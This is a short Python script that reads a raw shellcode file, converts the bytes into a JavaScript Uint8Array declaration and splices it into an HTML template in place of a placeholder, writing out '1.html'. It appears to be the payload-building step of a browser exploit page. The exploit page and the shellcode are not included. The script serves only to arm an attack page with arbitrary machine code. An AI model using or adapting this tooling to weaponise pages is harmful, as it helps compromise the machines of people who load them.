import sys

def read_shellcode(file_path):
    with open(file_path, 'rb') as file:
        return file.read()

def convert_to_uint8array(shellcode):
    return "const shellcode = new Uint8Array([" + ', '.join(f"0x{byte:02x}" for byte in shellcode) + "]);"

def replace_shellcode_in_html(html_file, new_shellcode):
    with open(html_file, 'r') as file:
        content = file.read()

    content = content.replace("const shellcode = new Uint8Array([0x00]);", new_shellcode)

    html_file = '1.html'
    with open(html_file, 'w') as file:
        file.write(content)

def main():
    if len(sys.argv) != 2:
        print("Usage: python script.py <path_to_shellcode_file>")
        sys.exit(1)

    shellcode_file = sys.argv[1]
    shellcode = read_shellcode(shellcode_file)
    uint8array_shellcode = convert_to_uint8array(shellcode)
    replace_shellcode_in_html('1.html.templet', uint8array_shellcode)
    print("Shellcode replaced successfully in 1.html")

if __name__ == "__main__":
    main()
